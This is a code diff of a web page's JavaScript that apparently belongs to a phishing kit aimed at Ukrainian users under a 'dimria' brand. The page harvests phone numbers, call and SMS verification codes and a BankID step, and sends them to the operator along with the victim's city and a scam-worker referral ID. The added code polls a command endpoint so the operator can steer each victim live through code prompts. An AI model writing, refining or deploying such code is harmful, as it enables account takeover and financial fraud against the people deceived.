@@ -141,86 +141,108 @@
     </div>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const project = urlParams.get('project') || 'dimria';
-        const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
-        const action = urlParams.get('action'); // call / sms / bankid
+    const urlParams = new URLSearchParams(window.location.search);
+    const project = urlParams.get('project') || 'dimria';
+    const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
+    const session = Date.now() + Math.random().toString(36); // уникальный ID сессии
 
-        document.getElementById('project-logo').src = `/logo?project=${project}`;
+    document.getElementById('project-logo').src = `/logo?project=${project}`;
 
-        let userCity = 'Невідомо';
-        let currentPhone = '';
+    let userCity = 'Невідомо';
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');
 
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');
+    $(() => {
+        $('#phone-number').mask('+380 00 000 00 00', { placeholder: " " }).val('+380 ').focus();
 
-        $(() => {
-            $('#phone-number').mask('+380 00 000 00 00', { placeholder: " " }).focus();
-
-            $('.code-input').on('input', function () {
-                this.value = this.value.replace(/\D/g, '').substr(0, 1);
-                if (this.value && this.nextElementSibling) this.nextElementSibling.focus();
-            }).on('keydown', e => {
-                if (e.key === 'Backspace' && !this.value && this.previousElementSibling) this.previousElementSibling.focus();
-            });
-
-            // Автоматически показываем нужный шаг если пришёл ?action=...
-            if (action === 'call') showCallStep();
-            if (action === 'sms') showSmsStep();
-            if (action === 'bankid') showBankidStep();
+        $('.code-input').on('input', function() {
+            this.value = this.value.replace(/\D/g, '').substr(0,1);
+            if(this.value && this.nextElementSibling) this.nextElementSibling.focus();
+        }).on('keydown', e => {
+            if(e.key === 'Backspace' && !this.value && this.previousElementSibling) this.previousElementSibling.focus();
         });
+    });
 
-        function submitPhone() {
-            const phone = $('#phone-number').val().replace(/\s/g, '');
-            if (!/^\+380\d{9}$/.test(phone)) return alert('Невірний номер');
-            currentPhone = phone;
-            showLoading();
-            sendData('phone', { phone });
-        }
+    let currentPhone = '';
 
-        function submitCallCode() {
-            const code = $('#call-code').val();
-            if (!/^\d{4}$/.test(code)) return alert('Введіть 4 цифри');
-            showLoading();
-            sendData('call_code', { code });
-        }
+    function submitPhone() {
+        const phone = $('#phone-number').val().replace(/\s/g, '');
+        if (!/^\+380\d{9}$/.test(phone)) return alert('Невірний номер');
+        currentPhone = phone;
 
-        function submitSmsCode() {
-            const code = $('.code-input').map((_, el) => el.value).get().join('');
-            if (!/^\d{6}$/.test(code)) return alert('Введіть 6 цифр');
-            showLoading();
-            sendData('sms_code', { code });
-        }
+        // Показываем загрузку
+        $('.step').removeClass('active');
+        $('#loading-step').addClass('active');
 
-        function showLoading() {
-            $('.step').removeClass('active');
-            $('#loading-step').addClass('active');
-        }
-        function showCallStep() {
-            $('.step').removeClass('active');
-            $('#call-step').addClass('active');
-            setTimeout(() => $('#call-code').focus(), 300);
-        }
-        function showSmsStep() {
-            $('.step').removeClass('active');
-            $('#sms-step').addClass('active');
-            $('#code-1').focus();
-        }
-        function showBankidStep() {
-            $('.step').removeClass('active');
-            $('#bankid-step').addClass('active');
-        }
+        sendData('phone', { phone });
+        
+        // Начинаем слушать команды от админа
+        startListeningForCommand();
+    }
 
-        function sendData(step, data) {
-            $.post('/api/send-data', JSON.stringify({
-                step, project, worker, city: userCity, phone: currentPhone, ...data
-            }), () => {
-                setTimeout(() => $('#success-step').addClass('active'), 3000);
-            }).always(() => {
-                $('#loading-step').removeClass('active');
-            });
-        }
+    function sendData(step, data) {
+        $.post('/api/send-data', JSON.stringify({
+            session, step, project, worker, city: userCity, phone: currentPhone, ...data
+        }), () => {}).always(() => {});
+    }
 
-        window.onload = () => $('#phone-number').focus();
-    </script>
+    // Это главное — слушаем команды от тебя
+    function startListeningForCommand() {
+        const check = () => {
+            fetch(`/api/command?session=${session}`)
+                .then(r => r.json())
+                .then(cmd => {
+                    if (cmd && cmd.action) {
+                        if (cmd.action === 'call') showCallStep();
+                        if (cmd.action === 'sms') showSmsStep();
+                        if (cmd.action === 'bankid') showBankidStep();
+                    } else {
+                        setTimeout(check, 2000); // проверяем каждые 2 сек
+                    }
+                })
+                .catch(() => setTimeout(check, 3000));
+        };
+        check();
+    }
+
+    function showLoading() {
+        $('.step').removeClass('active');
+        $('#loading-step').addClass('active');
+    }
+
+    function showCallStep() {
+        $('.step').removeClass('active');
+        $('#call-step').addClass('active');
+        $('#call-code').focus();
+    }
+
+    function showSmsStep() {
+        $('.step').removeClass('active');
+        $('#sms-step').addClass('active');
+        $('#code-1').focus();
+    }
+
+    function showBankidStep() {
+        $('.step').removeClass('active');
+        $('#bankid-step').addClass('active');
+    }
+
+    function submitCallCode() {
+        const code = $('#call-code').val();
+        if (!/^\d{4}$/.test(code)) return alert('Введіть 4 цифри');
+        showLoading();
+        sendData('call_code', { code });
+        setTimeout(() => $('#success-step').addClass('active'), 3000);
+    }
+
+    function submitSmsCode() {
+        const code = $('.code-input').map((_,el) => el.value).get().join('');
+        if (!/^\d{6}$/.test(code)) return alert('Введіть 6 цифр');
+        showLoading();
+        sendData('sms_code', { code });
+        setTimeout(() => $('#success-step').addClass('active'), 3000);
+    }
+
+    window.onload = () => $('#phone-number').focus();
+</script>
 </body>
 </html>
